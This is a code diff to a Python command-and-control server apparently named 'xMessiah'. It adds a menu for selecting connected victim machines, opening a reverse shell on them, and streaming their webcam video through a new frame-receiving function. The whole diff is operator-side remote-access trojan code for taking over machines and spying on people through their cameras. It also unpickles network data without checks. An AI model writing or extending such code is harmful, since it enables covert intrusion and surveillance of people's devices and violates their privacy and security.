@@ -3,6 +3,9 @@ import sys
 import time
 import threading
 from queue import Queue
+import struct
+import cv2
+import pickle
 
 HOST = "0.0.0.0"
 PORT = 5000
@@ -16,7 +19,7 @@ all_addresses = []
 def socket_create():
     try:
         print("Creating a socket")
-        server_socket = socket.socket()
+        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         return server_socket
     except socket.error as msg:
         print("Socket creation error: " + str(msg))
@@ -47,16 +50,32 @@ def accept_connections(server_socket):
         except:
             print("Error accepting connections")
 
-# Interactive prompt for sending commands remotely
+# Print help info and menu of actions user can choose from
+def printMenu():
+    print('----- xMessiah menu -----')
+    print('list - lists server_sockets')
+    print('select --number - choose a target from server_socket list and start a reverse shell')
+    print('camera --number - choose a target from server_socket list and start capturing camera view')
+    print('help - prints that info')
+    print('-------------------------')
+
+# Interactive prompt
 def start_turtle():
+    printMenu()
     while True:
         command = input('xMessiah> ')
         if command == 'list':
             list_connections()
+        elif command == 'help':
+            printMenu()
         elif 'select' in command:
-            connection = get_target(command)
+            connection = get_target(command, 1)
             if connection is not None:
-                send_target_commands(connection)          
+                send_target_commands(connection)
+        elif 'camera' in command: 
+            connection = get_target(command, 2)
+            if connection is not None:
+                receiveCameraData(connection)
         else:
             print("Command not recognized")
 
@@ -64,7 +83,7 @@ def list_connections():
     results = ''
     for i, connection in enumerate(all_connections):
         try:
-            connection.send(str.encode(' '))
+            connection.send(str.encode('connect'))
             connection.recv(4096)
         except:
             del all_connections[i]
@@ -73,9 +92,12 @@ def list_connections():
         results += str(i) + '  |  ' + str(all_addresses[i][0]) + '  |  ' + str(all_addresses[i][1]) + '\n'
     print('----- Clients -----' + '\n' + results)
 
-def get_target(command):
+def get_target(command, type):
     try:
-        target = int(command.replace('select ', ''))
+        if type == 1:
+            target = int(command.replace('select ', ''))
+        elif type == 2:
+            target = int(command.replace('camera ', ''))
         connection = all_connections[target]
         print("You are now connected to " + str(all_addresses[target][0]))
         print(str(all_addresses[target][0]) + '> ', end="")
@@ -85,6 +107,7 @@ def get_target(command):
         return None
 
 def send_target_commands(connection):
+    connection.send(str.encode('2', "utf-8"))
     while True:
         try:
             command = input()
@@ -97,6 +120,29 @@ def send_target_commands(connection):
         except:
             print("Connection was lost")
             break
+
+
+def receiveCameraData(connection):
+    connection.send(str.encode('1', "utf-8"))
+    data = b""
+    payload_size = struct.calcsize(">L")
+    while True:
+        while len(data) < payload_size:
+            data += connection.recv(4096)
+
+            packed_msg_size = data[:payload_size]
+            data = data[payload_size:]
+            msg_size = struct.unpack(">L", packed_msg_size)[0]
+
+            while len(data) < msg_size:
+                data += connection.recv(4096)
+            frame_data = data[:msg_size]
+            data = data[msg_size:]
+
+            frame = pickle.loads(frame_data, fix_imports=True, encoding="bytes")
+            frame = cv2.imdecode(frame, cv2.IMREAD_COLOR)
+            cv2.imshow('ImageWindow',frame)
+            cv2.waitKey(1)
 
 # Create worker threads
 def create_workers():
